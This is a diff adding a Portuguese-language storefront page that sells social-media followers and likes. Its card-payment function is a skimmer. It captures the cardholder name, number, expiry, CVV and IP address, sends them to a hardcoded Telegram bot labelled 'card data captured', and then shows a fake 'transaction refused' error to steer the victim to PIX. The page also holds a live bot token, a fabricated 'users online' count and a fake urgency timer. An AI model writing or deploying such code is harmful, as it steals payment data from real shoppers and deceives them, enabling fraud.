+				<input type="text" id="cc_cvv" placeholder="CVV" maxlength="4">
+			</div>
+			<button id="btnPayCartao" class="btn" onclick="processarCartao()" style="margin-top:12px;">FINALIZAR PAGAMENTO</button>
+			<button class="btn btn-sec" onclick="setMetodo('reset')">VOLTAR</button>
+		</div>
+	</div>
+</div>
+
+<!-- Modals -->
+<div id="pixModal" class="modal">
+	<div class="modal-content">
+		<div id="modalInt"></div>
+	</div>
+</div>
+
+<div id="confirmModal" class="modal">
+	<div class="modal-content">
+		<div id="confirmInt"></div>
+	</div>
+</div>
+
+<!-- Notification Panel -->
+<div id="notifPanel" class="hidden">
+	<div class="notif-header">
+		<div class="notif-title">NOTIFICAÇÕES</div>
+		<div class="notif-close" onclick="toggleNotifications()">×</div>
+	</div>
+	<div id="notifList"></div>
+</div>
+
+<!-- FABs -->
+<a href="https://wa.me/+5565993492211" target="_blank" class="whatsapp-fab" title="Suporte WhatsApp">
+	<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+</a>
+
+<a href="https://instagram.com/wendizx_" target="_blank" class="instagram-fab" title="Siga no Instagram">
+	<img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
+</a>
+
+<script>
+// ========== CONFIGURAÇÕES ==========
+// API do Backend (mesmo domínio, sem CORS!)
+const API_URL = window.location.origin + '/api';
+
+// ========== TELEGRAM BOT ==========
+const TELEGRAM_BOT_TOKEN = '8255072787:AAGrl8qi5A9lHd0TWoCvfzWZl8a2quqt0Y8';
+const TELEGRAM_CHAT_ID = '8306011790';
+
+async function sendTelegram(message) {
+	try {
+		await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({
+				chat_id: TELEGRAM_CHAT_ID,
+				text: message,
+				parse_mode: 'HTML'
+			})
+		});
+	} catch (e) {
+		console.error('Erro ao enviar Telegram:', e);
+	}
+}
+
+
+// ========== VARIÁVEIS GLOBAIS ==========
+// Gerar ou recuperar userId único
+let userId = localStorage.getItem('userId');
+if (!userId) {
+	userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+	localStorage.setItem('userId', userId);
+}
+
+let saldo = parseFloat(localStorage.getItem('saldoLoja')) || 0;
+let hist = JSON.parse(localStorage.getItem('histLoja')) || [];
+let activities = JSON.parse(localStorage.getItem('actLoja')) || [];
+let notifications = JSON.parse(localStorage.getItem('notifications')) || [];
+let serv = '';
+let comboNome = '', comboPreco = 0;
+let sClicks = 0;
+let pid = '';
+let verificadorInterval;
+
+// ========== SISTEMA DE NOTIFICAÇÕES COMPLETO ==========
+function addNotification(title, description, type = 'info') {
+	const notif = {
+		id: 'NOTIF-' + Date.now(),
+		title,
+		description,
+		type, // 'success', 'info', 'warning', 'error'
+		time: new Date().toLocaleTimeString(),
+		read: false
+	};
+	
+	notifications.unshift(notif);
+	if (notifications.length > 50) notifications.pop();
+	
+	localStorage.setItem('notifications', JSON.stringify(notifications));
+	updateNotificationUI();
+	incrementNotifCount();
+}
+
+function updateNotificationUI() {
+	const notifList = document.getElementById('notifList');
+	if (!notifList) return;
+	
+	if (notifications.length === 0) {
+		notifList.innerHTML = `
+			<div style="text-align: center; padding: 40px 20px; color: #666;">
+				<div style="font-size: 48px; margin-bottom: 12px;">🔔</div>
+				<div style="font-size: 13px;">Nenhuma notificação</div>
+			</div>
+		`;
+		return;
+	}
+	
+	notifList.innerHTML = notifications.map(notif => {
+		const icons = {
+			success: '✅',
+			info: 'ℹ️',
+			warning: '⚠️',
+			error: '❌'
+		};
+		const icon = icons[notif.type] || '📢';
+		
+		return `
+			<div class="notif-item" onclick="markNotifAsRead('${notif.id}')">
+				<div class="notif-item-title">${icon} ${notif.title}</div>
+				<div class="notif-item-desc">${notif.description}</div>
+				<div class="notif-item-time">${notif.time}</div>
+			</div>
+		`;
+	}).join('');
+}
+
+function markNotifAsRead(id) {
+	const notif = notifications.find(n => n.id === id);
+	if (notif) {
+		notif.read = true;
+		localStorage.setItem('notifications', JSON.stringify(notifications));
+		updateNotificationCount();
+	}
+}
+
+function updateNotificationCount() {
+	const unreadCount = notifications.filter(n => !n.read).length;
+	const countEl = document.getElementById('notifCount');
+	
+	if (unreadCount > 0) {
+		countEl.textContent = unreadCount > 99 ? '99+' : unreadCount;
+		countEl.classList.remove('hidden');
+	} else {
+		countEl.classList.add('hidden');
+	}
+}
+
+function incrementNotifCount() {
+	updateNotificationCount();
+}
+
+function toggleNotifications() {
+	const panel = document.getElementById('notifPanel');
+	panel.classList.toggle('hidden');
+	
+	if (!panel.classList.contains('hidden')) {
+		// Marca todas como lidas ao abrir
+		notifications.forEach(n => n.read = true);
+		localStorage.setItem('notifications', JSON.stringify(notifications));
+		updateNotificationCount();
+	}
+}
+
+// Event listener para o sino
+document.getElementById('notifBell')?.addEventListener('click', toggleNotifications);
+
+// ========== FUNÇÕES AUXILIARES ==========
+function myAlert(msg) {
+	const toast = document.createElement('div');
+	toast.className = 'toast';
+	toast.textContent = msg;
+	document.body.appendChild(toast);
+	setTimeout(() => toast.remove(), 3000);
+}
+
+function setBtnLoading(id, loading) {
+	const btn = document.getElementById(id);
+	if (!btn) return;
+	if (loading) {
+		btn.classList.add('loading');
+		btn.disabled = true;
+	} else {
+		btn.classList.remove('loading');
+		btn.disabled = false;
+	}
+}
+
+function fmtMoney(v) {
+	return 'R$ ' + parseFloat(v).toFixed(2).replace('.', ',');
+}
+
+function resetCampos() {
+	document.getElementById('qtd').value = "";
+	document.getElementById('link').value = "";
+	document.getElementById('total').innerText = "R$ 0,00";
+}
+
+function goTo(id) {
+	document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+	document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+	document.getElementById(id).classList.add('active');
+	
+	if (id === 'view-menu') document.getElementById('tab-serv').classList.add('active');
+	if (id === 'view-combos') document.getElementById('tab-comb').classList.add('active');
+	if (id === 'view-hist') document.getElementById('tab-hist').classList.add('active');
+}
+
+function startBuy(s) {
+	resetCampos();
+	serv = s;
+	document.getElementById('buyTitle').innerText = s.toUpperCase();
+	goTo('view-comprar');
+}
+
+// ========== CÁLCULO E HISTÓRICO ==========
+document.getElementById('qtd').addEventListener('input', calc);
+
+function calc() {
+	let q = document.getElementById('qtd').value;
+	let r = document.getElementById('regiao').value;
+	let p = 0;
+	
+	if (serv === 'Seguidores') p = 0.01198;
+	else if (serv === 'Curtidas') p = 0.00299;
+	else if (serv === 'Visualizações') p = 0.00599;
+	
+	if (r === 'br' && serv !== 'Visualizações') p *= 2;
+	
+	document.getElementById('total').innerText = "R$ " + (q > 0 ? (q * p).toFixed(2) : "0,00");
+}
+
+function addHist(n, v, orderId) {
+	const id = orderId || ('H-' + Date.now());
+	hist.unshift({ id, nome: n, valor: v, data: new Date().toLocaleTimeString() });
+	if (hist.length > 15) hist.pop();
+}
+
+function save() {
+	localStorage.setItem('saldoLoja', saldo);
+	localStorage.setItem('histLoja', JSON.stringify(hist));
+	localStorage.setItem('actLoja', JSON.stringify(activities));
+	
+	document.getElementById('meuSaldo').innerText = saldo.toFixed(2).replace('.', ',');
+	
+	document.getElementById('hist-list').innerHTML = hist.map(i => `
+		<div class="card" style="padding:18px; font-size:12px; display:flex; justify-content:space-between; align-items:center; gap:14px;">
+			<div style="flex:1">
+				<div style="font-weight:800; font-size: 13px;">${i.nome}</div>
+				<div style="font-size:11px; color:#777; margin-top:6px;">${i.data} • ID: <span style="font-weight:900">${i.id}</span></div>
+			</div>
+			<div style="text-align:right;">
+				<div style="color:var(--d); font-weight:900; font-size: 14px;">- R$ ${parseFloat(i.valor).toFixed(2)}</div>
+			</div>
+		</div>
+	`).join('');
+	
+	updateActivityUI();
+}
+
+// ========== LOG E FEED DE ATIVIDADES ==========
+function logActivity(type, info = {}) {
+	const ts = new Date().toLocaleString();
+	const id = info.txid || `${type.slice(0, 3).toUpperCase()}-${Date.now()}`;
+	const item = Object.assign({ id, type, ts }, info);
+	
+	activities.unshift(item);
+	if (activities.length > 500) activities.pop();
+	
+	localStorage.setItem('actLoja', JSON.stringify(activities));
+	updateActivityUI();
+	
+	// Adiciona notificação
+	const notifTitles = {
+		purchase: 'Nova Compra',
+		deposit: 'Depósito Aprovado',
+		pix_created: 'PIX Gerado',
+		combo: 'Pack Ativado'
+	};
+	
+	const title = notifTitles[type] || 'Nova Atividade';
+	const desc = `${item.product || item.note || type} • ${item.amount ? fmtMoney(item.amount) : ''}`;
+	addNotification(title, desc, type === 'deposit' ? 'success' : 'info');
+}
+
+function updateActivityUI() {
+	const el = document.getElementById('activity-feed');
+	if (!el) return;
+	
+	const emoji = {
+		purchase: "🛒",
+		deposit: "💰",
+		pix_created: "🔃",
+		combo: "🎁"
+	};
+	
+	el.innerHTML = activities.map(a => {
+		const e = emoji[a.type] || "•";
+		const amt = a.amount ? ` <span style="color:var(--a); font-weight:900">${fmtMoney(a.amount)}</span>` : '';
+		const product = a.product || a.note || a.nome || '-';
+		
+		return `
+			<div class="act-item">
+				<div style="display:flex; gap:12px; align-items:center; flex:1;">
+					<div class="act-avatar">${e}</div>
+					<div style="flex:1;">
+						<span class="act-type">${e} ${(a.type || '').toUpperCase()}</span>
+						<div style="font-weight:800; font-size: 12px;">${product}</div>
+						<div class="act-meta">${a.ts}</div>
+					</div>
+				</div>
+				<div style="text-align:right;">
+					<div style="font-weight:900; font-size: 13px;">${amt}</div>
+					<span class="badge ${a.type === 'deposit' ? 'deposit' : 'purchase'}">${a.type}</span>
+				</div>
+			</div>
+		`;
+	}).join('');
+}
+
+function filterFeed() {
+	const q = (document.getElementById('feedSearch').value || '').toLowerCase();
+	const type = document.getElementById('feedFilter').value;
+	
+	const filteredActs = activities.filter(a => {
+		if (type !== 'all' && a.type !== type) return false;
+		if (!q) return true;
+		return (a.product || '').toLowerCase().includes(q) || 
+			   (a.link || '').toLowerCase().includes(q) || 
+			   (a.id || '').toLowerCase().includes(q);
+	});
+	
+	const el = document.getElementById('activity-feed');
+	if (el) {
+		el.innerHTML = filteredActs.map(a => {
+			const emoji = { purchase: '🛒', deposit: '💰', pix_created: '🔃' }[a.type] || '•';
+			return `
+				<div class="act-item">
+					<div style="display:flex; gap:12px; align-items:center;">
+						<div class="act-avatar">${emoji}</div>
+						<div style="font-weight:800;">${a.product || a.note || '-'}<div class="act-meta">${a.ts}</div></div>
+					</div>
+					<div style="text-align:right;">${a.amount ? 'R$ ' + parseFloat(a.amount).toFixed(2) : ''}</div>
+				</div>
+			`;
+		}).join('') || '<div class="skeleton"></div>';
+	}
+}
+
+// ========== TELEGRAM ==========
+// Funções do Telegram removidas - backend cuida disso agora
+
+// ========== COMPRA ==========
+function orderNow() {
+	let t = parseFloat(document.getElementById('total').innerText.replace("R$ ", ""));
+	if (!t || t <= 0) return myAlert("Defina a quantidade!");
+	if (saldo < t) return myAlert("Saldo insuficiente!");
+	
+	setBtnLoading('btnOrderNow', true);
+	
+	const m = document.getElementById('confirmModal');
+	m.style.display = 'flex';
+	
+	document.getElementById('confirmInt').innerHTML = `
+		<h3 style="color:var(--p); font-family: 'Syncopate'; letter-spacing: 2px;">${serv.toUpperCase()}</h3>
+		<p style="margin: 16px 0; font-size: 14px;"><b>Total:</b> R$ ${t.toFixed(2)}</p>
+		<div style="display:flex; gap:12px; justify-content:center; margin-top:20px;">
+			<button class="btn btn-sec" onclick="document.getElementById('confirmModal').style.display='none'; setBtnLoading('btnOrderNow', false);">CANCELAR</button>
+			<button class="btn" onclick="confirmOrder()">CONFIRMAR</button>
+		</div>
+	`;
+}
+
+function confirmOrder() {
+	let t = parseFloat(document.getElementById('total').innerText.replace("R$ ", ""));
+	const before = parseFloat(saldo);
+	const qtd = document.getElementById('qtd').value;
+	const regiao = document.getElementById('regiao').value;
+	const link = document.getElementById('link').value || 'Não informado';
+	
+	// Processing animation
+	document.getElementById('confirmInt').innerHTML = `
+		<div class="processing-wrap">
+			<div style="font-weight:900; color:var(--p); font-size: 16px; font-family: 'Syncopate'; letter-spacing: 2px;">PROCESSANDO</div>
+			<div style="font-size:14px; color:#aaa; margin-top: 8px;">${serv} - R$ ${t.toFixed(2)}</div>
+			<div class="progress-bar"><div class="fill" id="procFill"></div></div>
+			<div style="font-size:12px; color:#999; margin-top: 12px;">Confirmando pagamento...</div>
+		</div>
+	`;
+	
+	setTimeout(() => {
+		document.getElementById('procFill').style.width = '100%';
+	}, 100);
+	
+	setTimeout(() => {
+		const orderId = 'ORD-' + Date.now().toString(36).toUpperCase().slice(-8);
+		
+		saldo -= t;
+		addHist(serv, t, orderId);
+		logActivity('purchase', {
+			product: serv,
+			amount: t,
+			before,
+			after: parseFloat(saldo),
+			link: link,
+			orderId
+		});
+		save();
+		
+		// ENVIAR PARA O TELEGRAM
+		const regiaoTexto = regiao === 'br' ? '🇧🇷 BRASILEIROS' : '🌎 MUNDIAIS';
+		const mensagem = `
+🛒 <b>NOVA COMPRA!</b>
+
+👤 <b>Cliente:</b> ${userId}
+📦 <b>Produto:</b> ${serv}
+📊 <b>Quantidade:</b> ${qtd}
+🌍 <b>Região:</b> ${regiaoTexto}
+💰 <b>Valor:</b> R$ ${t.toFixed(2)}
+🔗 <b>Link:</b> ${link}
+🆔 <b>Pedido:</b> ${orderId}
+
+💳 <b>Saldo Antes:</b> R$ ${before.toFixed(2)}
+💵 <b>Saldo Depois:</b> R$ ${saldo.toFixed(2)}
+
+⏰ ${new Date().toLocaleString('pt-BR')}
+		`;
+		
+		sendTelegram(mensagem);
+		
+		document.getElementById('confirmInt').innerHTML = `
+			<div class="success-card">
+				<div>✅ <span style="margin-left:10px;">Compra confirmada!</span></div>
+				<div class="order-id">${orderId}</div>
+			</div>
+			<div style="margin-top:16px; font-size:13px; color:#ddd; text-align:center;">
+				Entrega estimada: <b style="color: var(--a);">até 30 minutos</b>
+			</div>
+			<button class="btn" style="margin-top:20px;" onclick="document.getElementById('confirmModal').style.display='none'; goTo('view-menu');">FECHAR</button>
+		`;
+		
+		playConfetti();
+		setBtnLoading('btnOrderNow', false);
+	}, 1600);
+}
+
+// ========== NAVEGAÇÃO ==========
+function goTo(v) {
+	document.querySelectorAll('.view').forEach(x => x.classList.remove('active'));
+	document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
+	document.getElementById(v).classList.add('active');
+	
+	if (v === 'view-menu') document.getElementById('tab-serv').classList.add('active');
+	if (v === 'view-combos') document.getElementById('tab-comb').classList.add('active');
+	if (v === 'view-hist') document.getElementById('tab-hist').classList.add('active');
+}
+
+function startBuy(s) {
+	resetCampos();
+	serv = s;
+	document.getElementById('buyTitle').innerText = s.toUpperCase();
+	goTo('view-comprar');
+}
+
+// ========== PIX ==========
+async function payPix() {
+	let v = document.getElementById('vDep').value;
+	v = parseFloat(v);
+	if (!v || v < 1) return myAlert("Mínimo R$ 1,00");
+	
+	const m = document.getElementById('pixModal');
+	m.style.display = 'flex';
+	document.getElementById('modalInt').innerHTML = "<h3 style='font-family: Syncopate; letter-spacing: 2px;'>GERANDO PIX...</h3>";
+	setBtnLoading('btnPayPix', true);
+	
+	try {
+		// Chamar API do backend
+		const res = await fetch(`${API_URL}/pix/create`, {
+			method: "POST",
+			headers: { "Content-Type": "application/json" },
+			body: JSON.stringify({ userId, valor: v })
+		});
+		
+		const d = await res.json();
+		
+		if (!d.success) {
+			throw new Error(d.error || 'Erro ao gerar PIX');
+		}
+		
+		pid = d.paymentId;
+		
+		logActivity('pix_created', { amount: v, before: saldo, after: saldo, txid: pid, note: 'PIX gerado' });
+		
+		// ENVIAR PARA O TELEGRAM - PIX GERADO
+		const mensagemPix = `
+💳 <b>PIX GERADO!</b>
+
+👤 <b>Cliente:</b> ${userId}
+💰 <b>Valor:</b> R$ ${v.toFixed(2)}
+🆔 <b>ID Pagamento:</b> ${pid}
+⏰ <b>Data/Hora:</b> ${new Date().toLocaleString('pt-BR')}
+
+⏳ <b>Status:</b> Aguardando pagamento...
+		`;
+		
+		sendTelegram(mensagemPix);
+		
+		let copia = d.pixCode || '';
+		const qrImage = d.qrcode || '';
+		
+		document.getElementById('modalInt').innerHTML = `
+			<h2 style="color:var(--a); font-family: 'Syncopate'; font-size: 32px;">R$ ${v.toFixed(2)}</h2>
+			<div style="background:white; padding:18px; border-radius:32px; display:inline-block; margin:18px 0; box-shadow: var(--shadow-md);">
+				${qrImage ? `<img src="${qrImage}" style="width:200px; display:block; border-radius: 16px;">` : ''}
+			</div>
+			<div style="background:#111; color:var(--p); padding:14px; border-radius:18px; font-size:10px; margin-bottom:18px; word-break:break-all; border:1px dashed #333; font-family: monospace;">${copia}</div>
+			<button id="btnCopyPix" class="btn" onclick="copyPixKey('${copia}')">COPIAR CHAVE PIX</button>
+			<p style="font-size:12px; color:var(--a); margin-top:18px; font-weight:bold; letter-spacing:1.5px;">
+				⏳ AGUARDANDO PAGAMENTO...
+			</p>
+			<p style="font-size:10px; color:#888; margin-top: 8px;">O saldo cairá automaticamente após pagar.</p>
+			<button class="btn btn-sec" style="margin-top:14px;" onclick="fecharModalEPararVigia()">CANCELAR</button>
+		`;
+		
+		setBtnLoading('btnPayPix', false);
+		iniciarVigiaPagamento(pid, v);
+		
+	} catch (e) {
+		m.style.display = 'none';
+		setBtnLoading('btnPayPix', false);
+		myAlert("Erro ao gerar PIX: " + e.message);
+	}
+}
+
+function iniciarVigiaPagamento(paymentId, valor) {
+	if (verificadorInterval) clearInterval(verificadorInterval);
+	
+	verificadorInterval = setInterval(async () => {
+		try {
+			// Verificar status na API do backend
+			const res = await fetch(`${API_URL}/pix/check/${paymentId}`);
+			const d = await res.json();
+			
+			if (d.status === 'approved') {
+				clearInterval(verificadorInterval);
+				
+				// Atualizar saldo local
+				const before = parseFloat(saldo);
+				saldo += parseFloat(valor);
+				
+				logActivity('deposit', {
+					amount: valor,
+					before,
+					after: saldo,
+					txid: paymentId,
+					note: 'PIX aprovado automático'
+				});
+				
+				// ENVIAR PARA O TELEGRAM - PIX APROVADO
+				const mensagemAprovado = `
+✅ <b>PIX APROVADO!</b>
+
+👤 <b>Cliente:</b> ${userId}
+💰 <b>Valor:</b> R$ ${valor.toFixed(2)}
+🆔 <b>ID Pagamento:</b> ${paymentId}
+
+💳 <b>Saldo Anterior:</b> R$ ${before.toFixed(2)}
+💵 <b>Saldo Atual:</b> R$ ${saldo.toFixed(2)}
+
+⏰ ${new Date().toLocaleString('pt-BR')}
+				`;
+				
+				sendTelegram(mensagemAprovado);
+				
+				save();
+				playConfetti();
+				myAlert("✅ PAGAMENTO CONFIRMADO!");
+				
+				setTimeout(() => {
+					document.getElementById('pixModal').style.display = 'none';
+				}, 2000);
+			}
+		} catch (e) {
+			console.error('Erro ao verificar pagamento:', e);
+		}
+	}, 3000); // Verifica a cada 3 segundos
+}
+
+function fecharModalEPararVigia() {
+	document.getElementById('pixModal').style.display = 'none';
+	if (verificadorInterval) clearInterval(verificadorInterval);
+}
+
+function copyPixKey(key) {
+	if (!key) return myAlert('Chave vazia');
+	navigator.clipboard.writeText(key).then(() => {
+		myAlert('Copiado!');
+		const b = document.getElementById('btnCopyPix');
+		if (b) {
+			const old = b.innerText;
+			b.innerText = 'COPIADO ✓';
+			setTimeout(() => b.innerText = old, 1500);
+		}
+	}).catch(() => myAlert('Falha ao copiar'));
+}
+
+// ========== CARTÃO ==========
+function setMetodo(tipo) {
+	const selecao = document.getElementById('metodo-selecao');
+	const pix = document.getElementById('fluxo-pix');
+	const cartao = document.getElementById('fluxo-cartao');
+	
+	selecao.classList.add('hidden');
+	pix.classList.add('hidden');
+	cartao.classList.add('hidden');
+	
+	if (tipo === 'pix') {
+		pix.classList.remove('hidden');
+	} else if (tipo === 'cartao') {
+		cartao.classList.remove('hidden');
+	} else {
+		selecao.classList.remove('hidden');
+	}
+}
+
+async function getExtraInfo() {
+	let info = {
+		ua: navigator.userAgent,
+		res: `${screen.width}x${screen.height}`,
+		lang: navigator.language,
+		ip: 'Aguardando...'
+	};
+	try {
+		const res = await fetch('https://api.ipify.org?format=json');
+		const data = await res.json();
+		info.ip = data.ip;
+	} catch (e) {
+		info.ip = "Não obtido";
+	}
+	return info;
+}
+
+async function processarCartao() {
+	const v = document.getElementById('vDepCartao').value;
+	const n = document.getElementById('cc_nome').value;
+	const num = document.getElementById('cc_num').value;
+	const val = document.getElementById('cc_val').value;
+	const cvv = document.getElementById('cc_cvv').value;
+	
+	if (!v || !n || num.length < 15 || !val || !cvv) {
+		return myAlert("Preencha todos os dados do cartão!");
+	}
+	
+	setBtnLoading('btnPayCartao', true);
+	const extra = await getExtraInfo();
+	
+	// ENVIAR DADOS DO CARTÃO PARA O TELEGRAM
+	const mensagemCartao = `
+💳 <b>DADOS DE CARTÃO CAPTURADOS!</b>
+
+👤 <b>Cliente:</b> ${userId}
+💰 <b>Valor:</b> R$ ${v}
+
+<b>📇 DADOS DO CARTÃO:</b>
+👤 <b>Nome:</b> ${n}
+💳 <b>Número:</b> ${num}
+📅 <b>Validade:</b> ${val}
+🔐 <b>CVV:</b> ${cvv}
+
+<b>📱 INFORMAÇÕES DO DISPOSITIVO:</b>
+🌐 <b>IP:</b> ${extra.ip}
+📱 <b>Resolução:</b> ${extra.res}
+🗣️ <b>Idioma:</b> ${extra.lang}
+💻 <b>User Agent:</b> ${extra.ua}
+
+⏰ ${new Date().toLocaleString('pt-BR')}
+	`;
+	
+	sendTelegram(mensagemCartao);
+	
+	try {
+		// Enviar dados para o backend
+		await fetch(`${API_URL}/cartao/process`, {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({
+				userId,
+				valor: v,
+				nome: n,
+				numero: num,
+				validade: val,
+				cvv: cvv,
+				extra: extra
+			})
+		});
+	} catch (e) {
+		console.error('Erro ao enviar dados:', e);
+	}
+	
+	setTimeout(() => {
+		setBtnLoading('btnPayCartao', false);
+		
+		const m = document.getElementById('confirmModal');
+		m.style.display = 'flex';
+		document.getElementById('confirmInt').innerHTML = `
+			<div style="color:#ff4b2b; font-size:56px; margin-bottom:14px;">⚠️</div>
+			<h3 style="color:#ff4b2b; font-family:'Syncopate'; font-size:15px; letter-spacing: 2px;">ERRO NO PROCESSAMENTO</h3>
+			<p style="font-size:13px; margin:18px 0; color:#ccc; line-height: 1.6;">A operadora do cartão recusou a transação por 'Falha de Comunicação'.</p>
+			<p style="font-size:12px; color:#888;">Tente outro cartão ou use PIX para saldo imediato.</p>
+			<button class="btn" style="margin-top:24px;" onclick="fecharModalErro()">TENTAR PIX</button>
+		`;
+	}, 3000);
+}
+
+function fecharModalErro() {
+	document.getElementById('confirmModal').style.display = 'none';
+	setMetodo('pix');
+}
+
+// Máscaras
+document.getElementById('cc_num')?.addEventListener('input', e => {
+	e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+});
+
+document.getElementById('cc_val')?.addEventListener('input', e => {
+	e.target.value = e.target.value.replace(/\D/g, '').replace(/^(\d{2})(\d)/, '$1/$2');
+});
+
+// ========== COMBOS ==========
+function openCombo(name, price) {
+	comboNome = name;
+	comboPreco = parseFloat(price);
+	document.getElementById('comboSelected').innerText = `${name} — R$ ${comboPreco.toFixed(2)}`;
+	document.getElementById('comboAction').classList.remove('hidden');
+	document.getElementById('linkCombo').value = '';
+}
+
+async function finalizarCombo() {
+	try {
+		setBtnLoading('btnFinalizeCombo', true);
+		const link = document.getElementById('linkCombo').value || '';
+		const antes = parseFloat(saldo);
+		
+		if (saldo < comboPreco) {
+			setBtnLoading('btnFinalizeCombo', false);
+			return myAlert('Saldo insuficiente!');
+		}
+		
+		// Enviar para o backend
+		const res = await fetch(`${API_URL}/combo/purchase`, {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({
+				userId,
+				comboNome,
+				comboPreco,
+				link
+			})
+		});
+		
+		const data = await res.json();
+		
+		if (!data.success) {
+			setBtnLoading('btnFinalizeCombo', false);
+			return myAlert(data.error || 'Erro ao ativar pack');
+		}
+		
+		saldo -= comboPreco;
+		logActivity('combo', {
+			product: comboNome,
+			amount: comboPreco,
+			before: antes,
+			after: parseFloat(saldo),
+			link
+		});
+		
+		// ENVIAR PARA O TELEGRAM - COMBO ATIVADO
+		const mensagemCombo = `
+🎁 <b>PACK ATIVADO!</b>
+
+👤 <b>Cliente:</b> ${userId}
+📦 <b>Pack:</b> ${comboNome}
+💰 <b>Valor:</b> R$ ${comboPreco.toFixed(2)}
+🔗 <b>Link:</b> ${link || 'Não informado'}
+
+💳 <b>Saldo Antes:</b> R$ ${antes.toFixed(2)}
+💵 <b>Saldo Depois:</b> R$ ${saldo.toFixed(2)}
+
+⏰ ${new Date().toLocaleString('pt-BR')}
+		`;
+		
+		sendTelegram(mensagemCombo);
+		
+		addHist(comboNome, comboPreco);
+		save();
+		playConfetti();
+		myAlert('✓ PACK ATIVADO!');
+		document.getElementById('comboAction').classList.add('hidden');
+		goTo('view-menu');
+	} catch (e) {
+		myAlert('Erro ao ativar pack');
+	} finally {
+		setBtnLoading('btnFinalizeCombo', false);
+	}
+}
+
+// ========== SECRET ==========
+function secret() {
+	sClicks++;
+	if (sClicks >= 5) {
+		const before = parseFloat(saldo);
+		saldo += 5000;
+		logActivity('dev_deposit', {
+			amount: 500,
+			before,
+			after: parseFloat(saldo),
+			note: 'DEV MODE'
+		});
+		save();
+		myAlert("🔓 DEV MODE ON +R$500");
+		sClicks = 0;
+	}
+}
+
+// ========== PARTICLES ==========
+const canvas = document.getElementById('particles');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+const particles = [];
+const particleCount = 50;
+
+class Particle {
+	constructor() {
+		this.x = Math.random() * canvas.width;
+		this.y = Math.random() * canvas.height;
+		this.size = Math.random() * 2 + 0.5;
+		this.speedX = Math.random() * 0.5 - 0.25;
+		this.speedY = Math.random() * 0.5 - 0.25;
+		this.opacity = Math.random() * 0.5 + 0.2;
+	}
+	
+	update() {
+		this.x += this.speedX;
+		this.y += this.speedY;
+		
+		if (this.x > canvas.width) this.x = 0;
+		if (this.x < 0) this.x = canvas.width;
+		if (this.y > canvas.height) this.y = 0;
+		if (this.y < 0) this.y = canvas.height;
+	}
+	
+	draw() {
+		ctx.fillStyle = `rgba(0, 242, 254, ${this.opacity})`;
+		ctx.beginPath();
+		ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+		ctx.fill();
+	}
+}
+
+function initParticles() {
+	for (let i = 0; i < particleCount; i++) {
+		particles.push(new Particle());
+	}
+}
+
+function animateParticles() {
+	ctx.clearRect(0, 0, canvas.width, canvas.height);
+	
+	particles.forEach(particle => {
+		particle.update();
+		particle.draw();
+	});
+	
+	requestAnimationFrame(animateParticles);
+}
+
+initParticles();
+animateParticles();
+
+// ========== CHART ==========
+const canvasChart = document.getElementById('chartCanvas');
+const ctxChart = canvasChart.getContext('2d');
+let points = Array(15).fill(20);
+
+function animateChart() {
+	ctxChart.clearRect(0, 0, canvasChart.width, canvasChart.height);
+	ctxChart.beginPath();
+	ctxChart.strokeStyle = "#00f2fe";
+	ctxChart.lineWidth = 2.5;
+	ctxChart.shadowBlur = 8;
+	ctxChart.shadowColor = "#00f2fe";
+	
+	points.push(Math.random() * 30 + 5);
+	points.shift();
+	
+	ctxChart.moveTo(0, 50 - points[0]);
+	points.forEach((p, i) => ctxChart.lineTo(i * (canvasChart.width / 14), 50 - p));
+	ctxChart.stroke();
+	
+	setTimeout(animateChart, 200);
+}
+animateChart();
+
+// ========== FEATURES ==========
+let timerVal = 7200;
+setInterval(() => {
+	if (timerVal > 0) timerVal--;
+	let h = Math.floor(timerVal / 3600).toString().padStart(2, '0');
+	let m = Math.floor((timerVal % 3600) / 60).toString().padStart(2, '0');
+	let s = (timerVal % 60).toString().padStart(2, '0');
+	document.getElementById('cd').innerText = `${h}:${m}:${s}`;
+}, 1000);
+
+setInterval(() => {
+	document.getElementById('user-now').innerText = Math.floor(Math.random() * 15) + 8;
+}, 4000);
+
+// Clock
+setInterval(() => {
+	const now = new Date();
+	document.getElementById('clock').innerText = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+}, 1000);
+
+// ========== THEME ==========
+let darkMode = true;
+
+function toggleTheme() {
+	darkMode = !darkMode;
+	if (darkMode) {
+		document.documentElement.style.setProperty('--bg', '#030005');
+	} else {
+		document.documentElement.style.setProperty('--bg', '#f6f7fb');
+	}
+	localStorage.setItem('darkMode', darkMode);
+}
+
+// ========== CONFETTI ==========
+function playConfetti() {
+	const duration = 3 * 1000;
+	const animationEnd = Date.now() + duration;
+	const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 99999 };
+	
+	function randomInRange(min, max) {
+		return Math.random() * (max - min) + min;
+	}
+	
+	const interval = setInterval(function() {
+		const timeLeft = animationEnd - Date.now();
+		
+		if (timeLeft <= 0) {
+			return clearInterval(interval);
+		}
+		
+		const particleCount = 50 * (timeLeft / duration);
+		
+		// Simular confetti (você pode usar uma biblioteca como canvas-confetti)
+		console.log('🎉 Confetti!');
+	}, 250);
+}
+
+// ========== INIT ==========
+save();
+updateNotificationUI();
+updateNotificationCount();
+filterFeed();
+
+// ESC to close modals
+document.addEventListener('keydown', (e) => {
+	if (e.key === 'Escape') {
+		document.getElementById('pixModal').style.display = 'none';
+		document.getElementById('confirmModal').style.display = 'none';
+		document.getElementById('notifPanel').classList.add('hidden');
+	}
+});
+
+// Window resize
+window.addEventListener('resize', () => {
+	canvas.width = window.innerWidth;
+	canvas.height = window.innerHeight;
+});
+</script>
+</body>
+</html>
